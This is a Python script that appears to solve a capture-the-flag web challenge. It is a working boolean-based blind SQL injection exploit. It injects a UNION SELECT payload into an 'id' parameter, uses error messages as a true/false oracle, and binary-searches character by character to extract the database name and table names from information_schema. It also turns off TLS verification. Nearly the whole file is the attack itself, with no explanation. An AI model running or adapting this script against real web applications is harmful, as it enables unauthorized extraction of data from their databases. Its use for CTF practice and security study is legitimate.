import requests
import urllib3
import sys

urllib3.disable_warnings()

s = requests.Session()
s.verify = False
url = "https://04a2b0dcb17c2e99.chal.ctf.ae/"

def oracle(cond):
    p = f"1 UNION SELECT 2 WHERE ({cond}) INTO @a"
    try:
        r = s.get(url, params={"id": p}, timeout=10)
        return "Fatal error" not in r.text
    except Exception as e:
        print("Req error:", e)
        return False

def get_len(expr):
    # binary search length
    lo, hi = 1, 200
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"LENGTH({expr})<={mid}"):
            hi = mid
        else:
            lo = mid + 1
    if oracle(f"LENGTH({expr})={lo}"):
        return lo
    return 0

def dump_str(expr):
    L = get_len(expr)
    print(f"Len of {expr}: {L}")
    res = []
    for i in range(1, L + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(f"ASCII(SUBSTRING({expr},{i},1))<={mid}"):
                hi = mid
            else:
                lo = mid + 1
        ch = chr(lo)
        res.append(ch)
        sys.stdout.write(ch)
        sys.stdout.flush()
    print()
    return "".join(res)

# Let's find tables
print("Current DB:", dump_str("database()"))

# Table count in current db
table_count = 0
for i in range(1, 20):
    if oracle(f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())={i}"):
        table_count = i
        break
print(f"Total tables: {table_count}")

for i in range(table_count):
    tbl = dump_str(f"(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1)")
    print(f"Table {i}: {tbl}")
